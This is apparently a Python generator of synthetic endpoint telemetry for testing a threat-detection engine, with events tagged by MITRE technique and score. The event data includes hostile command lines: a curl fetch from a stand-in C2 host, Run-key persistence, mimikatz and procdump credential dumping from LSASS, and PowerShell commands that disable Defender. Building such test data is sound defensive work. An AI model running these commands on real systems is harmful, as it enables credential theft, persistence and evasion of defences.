import json
import uuid
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

def _iso(ts: datetime) -> str:
    return ts.isoformat().replace("+00:00", "Z")

def _rand_pid() -> int:
    return random.randint(1000, 65000)

def make_event(
    timestamp: datetime,
    host: str,
    user: str,
    process_name: str,
    command_line: str,
    pid: int,
    ppid: int,
    event_type: str = "process_create",
    **extra
) -> dict:
    record = {
        "event_id": str(uuid.uuid4()),
        "timestamp": _iso(timestamp),
        "host": host,
        "user": user,
        "event_type": event_type,
        "pid": pid,
        "ppid": ppid,
        "process_name": process_name,
        "command_line": command_line,
    }
    record.update(extra)
    return record

def main():
    events = []
    start = datetime(2026, 8, 5, 9, 0, 0, tzinfo=timezone.utc)
    t = start

    def step(host, process_name, command_line, pid, ppid, **kwargs):
        events.append(make_event(
            timestamp=t, host=host, user="admin",
            process_name=process_name, command_line=command_line,
            pid=pid, ppid=ppid, **kwargs
        ))

    # 1. C2_BEACON (T1071)
    h1, p1, p1_sub = "HOST-C2", _rand_pid(), _rand_pid()
    step(h1, "curl.exe", "curl http://c2.com/payload", p1_sub, p1) # STRONG (5)
    step(h1, "beacon.exe", "beacon", p1_sub, p1) # MEDIUM (3) -> 8 >= 6

    # 2. PERSIST_RUN_KEY (T1547)
    h2, p2, p2_sub = "HOST-PERSIST", _rand_pid(), _rand_pid()
    step(h2, "reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d payload.exe", p2_sub, p2)
    step(h2, "reg.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v Updater /d payload.exe", p2_sub, p2)

    # 3. CRED_WALLET_SEARCH (T1003 + "wallet")
    h3, p3, p3_sub = "HOST-WALLET", _rand_pid(), _rand_pid()
    step(h3, "mimikatz.exe", "mimikatz.exe privilege::debug", p3_sub, p3) # STRONG (5)
    step(h3, "mimikatz.exe", "sekurlsa::logonpasswords wallet", p3_sub, p3) # WEAK (2) -> 7 >= 6

    # 4. CRED_BROWSER_STORE (T1003 + "chrome")
    h4, p4, p4_sub = "HOST-BROWSER", _rand_pid(), _rand_pid()
    step(h4, "procdump.exe", "procdump.exe -ma lsass.exe", p4_sub, p4) # MEDIUM (3)
    step(h4, "procdump.exe", "lsass.exe chrome_dump.dmp chrome", p4_sub, p4) # MEDIUM (3) -> 6 >= 6

    # 5. EVADE_SLEEP_SKIP (T1562 + "sleep")
    h5, p5, p5_sub = "HOST-SLEEP", _rand_pid(), _rand_pid()
    step(h5, "powershell.exe", "powershell set-mppreference -disableantispyware $true", p5_sub, p5) # STRONG (5)
    step(h5, "powershell.exe", "powershell -ep bypass sleep", p5_sub, p5) # WEAK (2) -> 7 >= 6

    # 6. EVADE_SANDBOX_DETECTED (T1562 + "sandbox")
    h6, p6, p6_sub = "HOST-SANDBOX", _rand_pid(), _rand_pid()
    step(h6, "powershell.exe", "powershell set-mppreference -disablebehaviormonitoring $true", p6_sub, p6) # STRONG (5)
    step(h6, "powershell.exe", "powershell -ep bypass sandbox", p6_sub, p6) # WEAK (2) -> 7 >= 6

    # Recon Intents (T1082) require 3 commands from RECON_COMMANDS
    def trigger_recon(host, keyword):
        root = _rand_pid()
        p = _rand_pid() # Use SAME pid for all 3 commands so they correlate!
        cmds = ["whoami.exe", "hostname.exe", "ipconfig.exe"]
        for cmd in cmds:
            step(host, cmd, f"{cmd} {keyword}", p, root)

    # 7. RECON_DOMAIN_CONTROLLER
    trigger_recon("HOST-RECON-DC", "domain")

    # 8. RECON_INSTALLED_AV
    trigger_recon("HOST-RECON-AV", "windefend")

    # 9. RECON_VIRTUALISATION
    trigger_recon("HOST-RECON-VM", "vmtools")

    # 10. RECON_NETWORK_SHARES
    trigger_recon("HOST-RECON-SHARE", "share")

    # 11. RECON_SYSTEM_UPTIME
    trigger_recon("HOST-RECON-UPTIME", "uptime")

    # 12. RECON_DEBUGGER
    trigger_recon("HOST-RECON-DEBUGGER", "debug")

    # 13. RECON_USER_ARTIFACTS
    trigger_recon("HOST-RECON-USER", "user")

    output_path = Path(__file__).parent / "datasets" / "comprehensive_telemetry.json"
    output_path.write_text(json.dumps(events, indent=2), encoding="utf-8")
    print(f"Generated {len(events)} events in {output_path}")

if __name__ == "__main__":
    main()
